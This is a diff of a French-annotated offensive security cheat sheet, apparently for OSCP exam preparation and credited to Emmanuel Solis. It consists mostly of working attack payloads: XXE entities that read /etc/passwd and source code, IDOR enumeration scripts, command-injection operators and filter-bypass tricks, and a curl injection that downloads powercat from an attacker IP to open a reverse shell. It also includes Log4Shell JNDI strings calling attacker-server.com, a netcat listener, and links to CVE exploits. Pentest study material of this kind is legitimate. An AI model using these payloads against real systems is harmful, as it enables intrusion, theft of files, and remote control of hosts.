 **Attribute**
 
 
+Commande `version` pour la rubrique « Identifying ».
+
 ```text
 version="1.0"/encoding="UTF-8"
 ```
@@ -3055,6 +3068,8 @@ version="1.0"/encoding="UTF-8"
 **Declaration**
 
 
+Exemple technique pour la rubrique « Identifying ».
+
 ```text
 <?xml version="1.0" encoding="UTF-8"?>
 ```
@@ -3062,32 +3077,28 @@ version="1.0"/encoding="UTF-8"
 
 ### Local File Disclosure
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Local File Disclosure ».
 
 ```text
 &[variable];
 ```
 
-
 ![XEE Payload](https://www.emmanuelsolis.com/img/xee01.png)
-
 
 ![XEE Result](https://www.emmanuelsolis.com/img/xee02.png)
 
 
 ### Reading Sensitive Files
 
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ![XEE Reading Sensitive Files](https://www.emmanuelsolis.com/img/xee03.png)
 
 
-```text
-/etc/passwd
-```
+**Paramètres et repères :**
+`/etc/passwd`  
 
+
+Exemple technique pour la rubrique « Reading Sensitive Files ».
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -3098,6 +3109,8 @@ Commandes, paramètres et exemples associés à cette technique.
 ```
 
 
+Exemple technique pour la rubrique « Reading Sensitive Files ».
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE config [
@@ -3107,6 +3120,8 @@ Commandes, paramètres et exemples associés à cette technique.
 ```
 
 
+Exemple technique pour la rubrique « Reading Sensitive Files ».
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
@@ -3115,6 +3130,8 @@ Commandes, paramètres et exemples associés à cette technique.
 <data>&localHosts;</data>
 ```
 
+
+Exemple technique pour la rubrique « Reading Sensitive Files ».
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -3128,6 +3145,8 @@ Commandes, paramètres et exemples associés à cette technique.
 ```
 
 
+Exemple technique pour la rubrique « Reading Sensitive Files ».
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE request [
@@ -3139,13 +3158,15 @@ Commandes, paramètres et exemples associés à cette technique.
 
 ### Reading Code source
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Reading Code source ».
 
 ```text
 | < > { } &
 ```
 
+
+Exemple technique pour la rubrique « Reading Code source ».
 
 ```xml
 <!DOCTYPE email [
@@ -3153,19 +3174,20 @@ Commandes, paramètres et exemples associés à cette technique.
 ]>
 ```
 
-
 ![XEE Reading Source Code](https://www.emmanuelsolis.com/img/xee04.png)
 
 
 ### Remote Code Execution
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Remote Code Execution ».
 
 ```text
 | < > { } &
 ```
 
+
+Exemple technique pour la rubrique « Remote Code Execution ».
 
 ```xml
 <?xml version="1.0"?>
@@ -3181,15 +3203,10 @@ Commandes, paramètres et exemples associés à cette technique.
 ```
 
 
-## IDOR (Insecure Direct Object Références)
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### Énumération
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Énumération ».
 
 ```bash
 # UID=1
@@ -3201,6 +3218,8 @@ Commandes, paramètres et exemples associés à cette technique.
 /documents/Report_2_12_2020.pdf
 ```
 
+
+Commande `url` pour la rubrique « Énumération ».
 
 ```bash
 # Script with regex to find the documents
@@ -3215,6 +3234,8 @@ for i in {1..10}; do
 done
 ```
 
+
+Commande `url` pour la rubrique « Énumération ».
 
 ```bash
 # Alternative script option to find any extension
@@ -3232,8 +3253,8 @@ done
 
 ### AJAX Calls
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `function` pour la rubrique « AJAX Calls ».
 
 ```javascript
 // Code Example
@@ -3256,15 +3277,21 @@ function changeUserPassword() {
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
+Commande `download.php` pour la rubrique « Hashing & Encoding ».
+
 ```text
 download.php?filename=ZmlsZV8xMjMucGRm
 ```
 
 
+Commande `download.php` pour la rubrique « Hashing & Encoding ».
+
 ```text
 download.php?filename=c81e728d9d4c2f636f067f89cc14862c
 ```
 
+
+Exemple technique pour la rubrique « Hashing & Encoding ».
 
 ```javascript
 $.ajax({
@@ -3281,13 +3308,12 @@ $.ajax({
 
 ### Compare User Roles
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`User2`  
 
 
-```text
-User2
-```
-
+Exemple technique pour la rubrique « Compare User Roles ».
 
 ```json
 {
@@ -3304,8 +3330,8 @@ User2
 
 ### Insecure APIs
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Insecure APIs ».
 
 ```json
 {
@@ -3326,14 +3352,16 @@ Examiner les entrées et les réponses de l'application web.
 
 ### Identifying
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Identifying ».
 
 ```powershell
 # Check if we are executing PowerShell or CMD
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
+
+Exemple technique pour la rubrique « Identifying ».
 
 ```php
 <?php
@@ -3348,6 +3376,8 @@ app.get("/createfile", function(req, res){
 ```
 
 
+Récupérer une ressource distante ou une réponse HTTP.
+
 ```bash
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
 ```
@@ -3355,8 +3385,8 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 ### Command Methods
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 ;
@@ -3366,10 +3396,14 @@ Commandes, paramètres et exemples associés à cette technique.
 **Semicolon**
 
 
+Exemple technique pour la rubrique « Command Methods ».
+
 ```text
 ;
 ```
 
+
+Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %3b
@@ -3379,6 +3413,8 @@ Commandes, paramètres et exemples associés à cette technique.
 **New Line**
 
 
+Exemple technique pour la rubrique « Command Methods ».
+
 ```text
 %0a
 ```
@@ -3387,10 +3423,14 @@ Commandes, paramètres et exemples associés à cette technique.
 **Background**
 
 
+Exemple technique pour la rubrique « Command Methods ».
+
 ```text
 &
 ```
 
+
+Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %26
@@ -3400,10 +3440,14 @@ Commandes, paramètres et exemples associés à cette technique.
 **Pipe**
 
 
+Exemple technique pour la rubrique « Command Methods ».
+
 ```text
 |
 ```
 
+
+Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %7c
@@ -3413,10 +3457,14 @@ Commandes, paramètres et exemples associés à cette technique.
 **AND**
 
 
+Exemple technique pour la rubrique « Command Methods ».
+
 ```text
 &&
 ```
 
+
+Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %26%26
@@ -3426,10 +3474,14 @@ Commandes, paramètres et exemples associés à cette technique.
 **OR**
 
 
+Exemple technique pour la rubrique « Command Methods ».
+
 ```text
 |
 ```
 
+
+Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %7c%7c
@@ -3439,6 +3491,8 @@ Commandes, paramètres et exemples associés à cette technique.
 **Sub-Shell**
 
 
+Exemple technique pour la rubrique « Command Methods ».
+
 ```text
 %60%60
 ```
@@ -3447,35 +3501,38 @@ Commandes, paramètres et exemples associés à cette technique.
 **Sub-Shell**
 
 
+Exemple technique pour la rubrique « Command Methods ».
+
 ```text
 $()
 ```
 
+
+Exemple technique pour la rubrique « Command Methods ».
 
 ```text
 %24%28%29
 ```
 
 
-### Bypassing Filters
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 #### Space is Blacklisted
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Space is Blacklisted ».
 
 ```text
 %09
 ```
 
 
+Exemple technique pour la rubrique « Space is Blacklisted ».
+
 ```text
 $IFS
 ```
 
+
+Exemple technique pour la rubrique « Space is Blacklisted ».
 
 ```json
 {ls,-la}
@@ -3484,8 +3541,8 @@ $IFS
 
 #### / or \ are Blacklisted
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `echo` pour la rubrique « / or \ are Blacklisted ».
 
 ```bash
 # to select /
@@ -3493,16 +3550,18 @@ echo ${PATH:0:1}
 ```
 
 
+Exemple technique pour la rubrique « / or \ are Blacklisted ».
+
 ```powershell
 # to select \
 $env:HOMEPATH[0]
 ```
 
 
-#### Commands are Blacklisted
+#### Commandes are Blacklisted
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Commandes are Blacklisted ».
 
 ```javascript
 $blacklist = ['whoami', 'cat', ...SNIP...];
@@ -3514,6 +3573,8 @@ foreach ($blacklist as $word) {
 ```
 
 
+Exemple technique pour la rubrique « Commandes are Blacklisted ».
+
 ```text
 ` or "
 
@@ -3521,15 +3582,21 @@ Example: w'h'o'am'i
 ```
 
 
+Exemple technique pour la rubrique « Commandes are Blacklisted ».
+
 ```text
 \
 ```
 
 
+Exemple technique pour la rubrique « Commandes are Blacklisted ».
+
 ```text
 $@
 ```
 
+
+Commande `examples` pour la rubrique « Commandes are Blacklisted ».
 
 ```text
 Examples:
@@ -3538,10 +3605,14 @@ Examples:
 ```
 
 
+Exemple technique pour la rubrique « Commandes are Blacklisted ».
+
 ```text
 ^
 ```
 
+
+Commande `example` pour la rubrique « Commandes are Blacklisted ».
 
 ```text
 Example:
@@ -3549,10 +3620,10 @@ Example:
 ```
 
 
-#### Reverse Commands
+#### Reverse Commandes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `echo` pour la rubrique « Reverse Commandes ».
 
 ```bash
 # Linux
@@ -3563,6 +3634,8 @@ $(rev<<<'imaohw')
 ```
 
 
+Exemple technique pour la rubrique « Reverse Commandes ».
+
 ```powershell
 # Windows
 "whoami"[-1..-20] -join ''
@@ -3572,10 +3645,10 @@ iex "$('imaohw'[-1..-20] -join '')"
 ```
 
 
-#### Encoded Commands
+#### Encoded Commandes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `echo` pour la rubrique « Encoded Commandes ».
 
 ```bash
 # Linux
@@ -3585,6 +3658,8 @@ echo -n 'cat /etc/passwd | grep 33' | base64
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
+
+Exemple technique pour la rubrique « Encoded Commandes ».
 
 ```powershell
 [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
@@ -3596,8 +3671,8 @@ iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64Str
 
 ### Automatic Tools
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `git` pour la rubrique « Automatic Tools ».
 
 ```bash
 # Installation
@@ -3616,6 +3691,8 @@ cd ./bashfuscator/bin/
 ```
 
 
+Commande `git` pour la rubrique « Automatic Tools ».
+
 ```powershell
 # Installation
 git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
@@ -3633,8 +3710,8 @@ Invoke-DOSfuscation\Encoding> 1
 
 ## Log4Shell
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Log4Shell ».
 
 ```bash
 # LDAP Payload
@@ -3644,6 +3721,8 @@ ${jndi:ldap://attacker-server.com:1389/a}
 ${jndi:rmi://attacker-server.com:1099/a}
 ```
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 # Using Curl
@@ -3657,10 +3736,14 @@ curl -X POST http://target-server.com/login -d "username=${jndi:ldap://attacker-
 ```
 
 
+Ouvrir un port d'écoute avec Netcat.
+
 ```bash
 nc -lvnp [listening_port]
 ```
 
+
+Commande `bash` pour la rubrique « Log4Shell ».
 
 ```bash
 # You can also use a tool like ysoserial (for Windows) to generate the payload.
@@ -3675,8 +3758,8 @@ ${jndi:ldap://attacker-server.com:1389/bash-reverse-shell}
 
 ## Exploiting CVEs
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `cve-2014-6287` pour la rubrique « Exploiting CVEs ».
 
 ```text
 CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution
@@ -3691,7 +3774,8 @@ https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
 CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
 ```
 
-
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
+
+<!-- refined-oscp -->
